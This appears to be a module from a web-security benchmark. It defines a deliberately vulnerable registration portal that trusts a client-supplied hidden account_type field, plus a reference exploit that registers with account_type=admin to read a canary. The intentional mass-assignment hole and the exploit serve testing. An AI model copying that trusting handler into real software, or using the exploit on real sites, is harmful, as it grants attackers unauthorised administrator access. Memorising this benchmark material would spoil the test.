// WSTG-IDNT-02 (4.3.2) — User Registration Process behaviour.
// In-memory portal (no DB). The registration form exposes a hidden
// `account_type` field defaulting to "standard". The handler trusts whatever
// account_type the client submits — so account_type=admin (or any conventional
// privileged role) creates a privileged account whose dashboard renders the
// canary. Mass-assignment / over-posting.

import crypto from 'node:crypto'
import { Scenario } from './scenario.mjs'

const SUFFIXES = ['', '/login', '/register']
const PRIVILEGED_ROLES = new Set(['admin', 'administrator', 'superuser', 'superadmin', 'staff', 'root'])
const isPrivileged = (t) => PRIVILEGED_ROLES.has(String(t || '').trim().toLowerCase())

let STATE = null
function state() {
  if (!STATE) STATE = { users: new Map(), sessions: new Map() }
  return STATE
}
const newSid = () => 's_' + crypto.randomBytes(16).toString('hex')

export const classDef = {
  wstgId: 'WSTG-IDNT-02',
  class: 'User Registration Privilege Escalation',
  defenceTiers: [0],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.basePath + '/register',
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' &&
    (s.chromeInjection.html.includes(s.basePath + '/register') || s.chromeInjection.html.includes(s.basePath)),

  matchesRequest({ reqUrl, scenario }) {
    const base = scenario.basePath
    if (reqUrl.pathname === base) return true
    if (!reqUrl.pathname.startsWith(base + '/')) return false
    return SUFFIXES.includes(reqUrl.pathname.slice(base.length))
  },

  async handleRequest({ req, reqUrl, scenario, session, helpers, renderPage, manifest }) {
    const base = scenario.basePath
    const suffix = reqUrl.pathname === base ? '' : reqUrl.pathname.slice(base.length)
    const st = state()
    const currentUser = session ? st.sessions.get(session) : null
    const form = () => new URLSearchParams(helpers.rawBody || '')
    const page = (inner) => ({ status: 200, body: renderPage(inner) })
    const redirect = (to, setCookie) => ({
      status: 302,
      headers: { Location: to, ...(setCookie ? { 'Set-Cookie': setCookie } : {}) },
      body: '',
    })

    // ── Register ──
    if (suffix === '/register') {
      if (req.method === 'POST') {
        const f = form()
        const u = (f.get('username') || '').trim()
        const p = f.get('password') || ''
        // VULNERABLE: account_type is taken straight from the request and
        // trusted. A privileged value here yields a privileged account.
        const accountType = f.get('account_type') || 'standard'
        if (!u || !p) return page(registerForm(base, 'Username and password are required.'))
        if (st.users.has(u)) return page(registerForm(base, 'That username is already taken.'))
        st.users.set(u, { password: p, privileged: isPrivileged(accountType) })
        const sid = newSid()
        st.sessions.set(sid, u)
        return redirect(base, `session=${sid}; Path=/; HttpOnly; SameSite=Lax`)
      }
      return page(registerForm(base))
    }

    // ── Login ──
    if (suffix === '/login') {
      if (req.method === 'POST') {
        const f = form()
        const u = (f.get('username') || '').trim()
        const p = f.get('password') || ''
        const rec = st.users.get(u)
        if (!rec || rec.password !== p) return page(loginForm(base, 'Invalid username or password.'))
        const sid = newSid()
        st.sessions.set(sid, u)
        return redirect(base, `session=${sid}; Path=/; HttpOnly; SameSite=Lax`)
      }
      return page(loginForm(base))
    }

    // ── Dashboard (base) ──
    if (!currentUser) return redirect(base + '/login')
    const rec = st.users.get(currentUser)
    if (rec?.privileged) {
      return page(scenario.adminBody.replace('{CANARY}', manifest.perDeployCanary))
    }
    return page(scenario.memberBody.replaceAll('{USER}', escapeHtml(currentUser)))
  },

  // Reference exploit: register with account_type=admin (mass-assignment), then
  // read the privileged dashboard canary on the auto-logged-in session.
  async fireExploit({ baseUrl, scenario, payload, helpers }) {
    const base = scenario.basePath
    let cookie = null
    const attacker = 'atk_' + crypto.randomBytes(4).toString('hex')
    const role = String(payload) // privileged account_type, e.g. "admin"
    const resp = await fetch(`${baseUrl}${base}/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `username=${encodeURIComponent(attacker)}&password=atkpass123&account_type=${encodeURIComponent(role)}`,
      redirect: 'manual',
    })
    const m = (resp.headers.get('set-cookie') || '').match(/session=([^;]+)/)
    if (m) cookie = `session=${m[1]}`
    return helpers.fetchWithCookie(`${baseUrl}${base}`, cookie)
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}

// ── view helpers (fixed field names so the exploit is deterministic) ──
function loginForm(base, err) {
  return `<section style="max-width:420px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 12px">Sign in</h2>
  ${err ? `<p role="alert" style="color:#b00;margin:0 0 12px">${escapeHtml(err)}</p>` : ''}
  <form method="POST" action="${base}/login" style="display:flex;flex-direction:column;gap:10px">
    <label>Username<input name="username" autocomplete="username" style="display:block;width:100%;padding:8px"></label>
    <label>Password<input name="password" type="password" autocomplete="current-password" style="display:block;width:100%;padding:8px"></label>
    <button type="submit" style="padding:9px 14px">Sign in</button>
  </form>
  <p style="margin-top:12px">No account? <a href="${base}/register">Create one</a>.</p>
</section>`
}
function registerForm(base, err) {
  return `<section style="max-width:420px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 12px">Create your account</h2>
  ${err ? `<p role="alert" style="color:#b00;margin:0 0 12px">${escapeHtml(err)}</p>` : ''}
  <form method="POST" action="${base}/register" style="display:flex;flex-direction:column;gap:10px">
    <label>Username<input name="username" autocomplete="username" style="display:block;width:100%;padding:8px"></label>
    <label>Password<input name="password" type="password" autocomplete="new-password" style="display:block;width:100%;padding:8px"></label>
    <input type="hidden" name="account_type" value="standard">
    <button type="submit" style="padding:9px 14px">Create account</button>
  </form>
  <p style="margin-top:12px">Already registered? <a href="${base}/login">Sign in</a>.</p>
</section>`
}
function escapeHtml(s) {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;')
}
